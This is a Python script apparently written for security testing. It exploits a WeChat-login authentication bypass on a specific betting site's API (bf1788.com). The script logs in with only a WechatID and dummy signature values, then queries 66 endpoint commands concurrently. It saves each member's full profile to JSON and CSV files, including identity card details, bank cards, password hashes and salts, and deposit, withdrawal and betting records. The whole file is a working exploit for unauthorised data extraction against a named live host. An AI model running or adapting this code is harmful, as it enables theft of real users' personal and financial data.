#!/usr/bin/env python3
"""
Complete member data extraction from bf1788.com via WechatLogin bypass.
Extracts data from ALL discovered API endpoints (66 cmds).
"""
import requests, urllib3, json, csv, os, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

url = "https://apib63.bf1788.com/boxApi.php"
base = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# All 66 discovered endpoints with descriptions
ALL_CMDS = [
    # PII
    (101, "Member Basic Info (PII)"),
    (516, "Member Full Profile (PII+Bank+IDCard+Salt+Password)"),
    (112, "Member PID/Structure"),
    (121, "Agent Info"),
    (519, "Birthday Flags"),
    # Financial
    (208, "Finance Summary"),
    (713, "Withdrawal Types"),
    (716, "Bank Card / Payment Methods"),
    (533, "Deposit Records"),
    (534, "Withdrawal Records"),
    (535, "Transfer Records"),
    (541, "Rebate/Commission Records"),
    (542, "Daily Bet Records"),
    (543, "Monthly Report"),
    (544, "Weekly Bet Records"),
    (545, "Monthly Records"),
    (529, "Transaction History"),
    (530, "Daily Transactions"),
    (531, "Deposit History"),
    (532, "Deposit History USD"),
    (536, "Financial Flow (line/fetch)"),
    # VIP
    (800, "Daily VIP Stats"),
    (802, "VIP Summary"),
    (804, "VIP Bonus Apply Status"),
    (905, "Bonus/Commission Records"),
    (904, "VIP Level"),
    # Games
    (300, "Game Halls (247)"),
    (301, "Game Groups (341)"),
    (302, "Game List (15017)"),
    (315, "Specific Game Info"),
    # Betting
    (260, "Game Betting Records"),
    (262, "Game History"),
    (264, "Bet Detail"),
    (266, "Game Records"),
    (267, "Game Settlement"),
    (542, "Weekly Bet Detail"),
    # Login/Status
    (511, "Game Launch URL"),
    (514, "Game URL"),
    (518, "Game Group Level"),
    (600, "Return Data"),
    (602, "Member Line Data"),
    (603, "Member Group Data"),
    (605, "Sub-member Info"),
    (606, "Member Line Data v2"),
    (607, "Weekly Bet Records"),
    (608, "Bet Statistics"),
    # System
    (100, "Session Keepalive"),
    (103, "Session Refresh"),
    (111, "Promotions"),
    (331, "Game Status"),
    (332, "Add Game"),
    (333, "Delete Game"),
    (402, "System Status"),
    (707, "Payment Type List"),
    (810, "Lottery List"),
    (814, "System Config"),
    (815, "Mini Game List"),
    (912, "System Setting"),
    (913, "System Setting"),
    (925, "System Setting"),
    (700, "Announcements"),
]


def login(wechatId):
    resp = requests.post(url, data={"cmd": "1000", "wechatId": wechatId, **base}, timeout=10, verify=False)
    d = resp.json()
    if d.get("status") == "0":
        return d["msg"]["sid"], d["msg"]["username"]
    return None, None


def fetch_cmd(cmd, sid, username, wechatId):
    params = {"cmd": str(cmd), "sid": sid, "username": username, "wechatId": wechatId, **base}
    try:
        r = requests.post(url, data=params, timeout=10, verify=False)
        return cmd, r.json()
    except Exception as e:
        return cmd, {"error": str(e)}


def extract_member(wechatId, output_dir=None):
    if output_dir is None:
        output_dir = "/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915"

    sid, username = login(wechatId)
    if not sid:
        print(f"[-] Failed to login with wechatId={wechatId}")
        return None

    print(f"[+] Login successful: sid={sid[:16]}..., username={username}")

    result = {
        "wechatId": wechatId,
        "sid": sid,
        "username": username,
        "data": {}
    }

    # Fetch all endpoints concurrently
    with ThreadPoolExecutor(max_workers=30) as pool:
        futures = {pool.submit(fetch_cmd, cmd, sid, username, wechatId): (cmd, desc) for cmd, desc in ALL_CMDS}
        for f in as_completed(futures):
            cmd, desc = futures[f]
            cmd_val, response = f.result()
            result["data"][str(cmd)] = {"desc": desc, "response": response}
            # Print key findings
            try:
                msg = response.get("msg", response.get("data", ""))
                if isinstance(msg, dict):
                    print(f"  cmd={cmd} ({desc}): dict keys={list(msg.keys())[:8]}")
                elif isinstance(msg, list):
                    print(f"  cmd={cmd} ({desc}): list[{len(msg)}]")
                elif isinstance(msg, str):
                    print(f"  cmd={cmd} ({desc}): '{msg[:50]}'")
            except:
                print(f"  cmd={cmd} ({desc}): {str(response)[:50]}")

    # Save JSON
    json_path = os.path.join(output_dir, f"full_member_data_{wechatId}.json")
    with open(json_path, "w") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n[+] Full JSON saved: {json_path}")

    # Save CSV
    csv_path = os.path.join(output_dir, f"member_data_{wechatId}.csv")
    _save_csv(result, csv_path)
    print(f"[+] CSV saved: {csv_path}")

    return result


def _save_csv(result, csv_path):
    row = {"wechatId": result["wechatId"], "sid": result["sid"], "username": result["username"]}
    for cmd_str, entry in result["data"].items():
        resp = entry["response"]
        msg = resp.get("msg", resp.get("data", ""))
        if isinstance(msg, dict):
            for k, v in msg.items():
                row[f"cmd{cmd_str}_{k}"] = str(v)[:500] if not isinstance(v, (list, dict)) else json.dumps(v, ensure_ascii=False)[:500]
        elif isinstance(msg, list):
            row[f"cmd{cmd_str}_list_count"] = len(msg)
            if msg:
                row[f"cmd{cmd_str}_list_0"] = json.dumps(msg[0], ensure_ascii=False)[:500]
        elif isinstance(msg, str):
            row[f"cmd{cmd_str}"] = msg
        else:
            row[f"cmd{cmd_str}"] = str(msg)[:200]

    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=sorted(row.keys()))
        writer.writeheader()
        writer.writerow(row)


if __name__ == "__main__":
    wechatId = sys.argv[1] if len(sys.argv) > 1 else "testwechat001"
    extract_member(wechatId)